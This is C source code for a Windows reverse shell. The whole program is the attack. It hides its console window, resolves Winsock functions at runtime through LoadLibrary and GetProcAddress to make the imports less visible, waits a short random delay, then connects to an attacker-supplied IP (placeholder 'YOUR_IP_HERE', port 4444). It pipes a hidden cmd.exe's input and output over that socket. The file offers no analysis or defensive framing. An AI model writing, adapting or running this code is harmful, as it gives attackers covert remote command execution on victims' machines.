#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>

#ifndef CLIENT_IP
#define CLIENT_IP "YOUR_IP_HERE"
#endif
#ifndef CLIENT_PORT
#define CLIENT_PORT 4444
#endif

// Function pointer types
typedef int (WINAPI *WSA_STARTUP)(WORD, void*);
typedef UINT_PTR (WINAPI *WSA_SOCKET)(int, int, int, void*, unsigned int, unsigned int);
typedef unsigned short (WINAPI *HTONS_FUNC)(unsigned short);
typedef unsigned long (WINAPI *INET_ADDR_FUNC)(const char*);
typedef int (WINAPI *CONNECT_FUNC)(UINT_PTR, const void*, int);
typedef int (WINAPI *CLOSESOCKET_FUNC)(UINT_PTR);
typedef int (WINAPI *WSA_CLEANUP)();

// Constants for socket API
#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define INVALID_SOCKET (~0)
#define SOCKET_ERROR (-1)
#define STARTF_USESTDHANDLES 0x00000100

int main() {
    // Hide console window
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
    
    // Load ws2_32.dll dynamically
    HMODULE ws2_lib = LoadLibraryA("ws2_32.dll");
    if (!ws2_lib) return 1;
    
    // Get function addresses
    WSA_STARTUP pfnWSAStartup = (WSA_STARTUP)GetProcAddress(ws2_lib, "WSAStartup");
    WSA_SOCKET pfnWSASocketA = (WSA_SOCKET)GetProcAddress(ws2_lib, "WSASocketA");
    HTONS_FUNC pfnHtons = (HTONS_FUNC)GetProcAddress(ws2_lib, "htons");
    INET_ADDR_FUNC pfnInetAddr = (INET_ADDR_FUNC)GetProcAddress(ws2_lib, "inet_addr");
    CONNECT_FUNC pfnConnect = (CONNECT_FUNC)GetProcAddress(ws2_lib, "connect");
    
    if (!pfnWSAStartup || !pfnWSASocketA || !pfnHtons || !pfnInetAddr || !pfnConnect) {
        FreeLibrary(ws2_lib);
        return 1;
    }
    
    // Initialize Winsock with buffer allocated on stack
    char wsaDataBuf[400] = {0}; // More than enough room for WSADATA
    WORD wVersionRequested = MAKEWORD(2, 2);
    if (pfnWSAStartup(wVersionRequested, wsaDataBuf)) {
        FreeLibrary(ws2_lib);
        return 1;
    }
    
    // Create socket
    UINT_PTR s = pfnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (s == INVALID_SOCKET) {
        FreeLibrary(ws2_lib);
        return 1;
    }
    
    // Setup connection
    struct {
        short sin_family;
        unsigned short sin_port;
        union {
            struct { unsigned char s_b1,s_b2,s_b3,s_b4; } S_un_b;
            struct { unsigned short s_w1,s_w2; } S_un_w;
            unsigned long S_addr;
        } sin_addr;
        char sin_zero[8];
    } sa;
    
    sa.sin_family = AF_INET;
    sa.sin_port = pfnHtons(CLIENT_PORT);
    sa.sin_addr.S_addr = pfnInetAddr(CLIENT_IP);
    memset(sa.sin_zero, 0, sizeof(sa.sin_zero));
    
    // Small random delay
    Sleep(800 + (GetTickCount() % 500));
    
    // Connect
    if (pfnConnect(s, &sa, sizeof(sa))) {
        FreeLibrary(ws2_lib);
        return 1;
    }
    
    // Prepare process
    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;
    
    PROCESS_INFORMATION pi = {0};
    
    // Create hidden cmd process
    if (!CreateProcessA(0, "cmd", 0, 0, 1, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        FreeLibrary(ws2_lib);
        return 1;
    }
    
    // Wait for process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    FreeLibrary(ws2_lib);
    
    return 0;
}
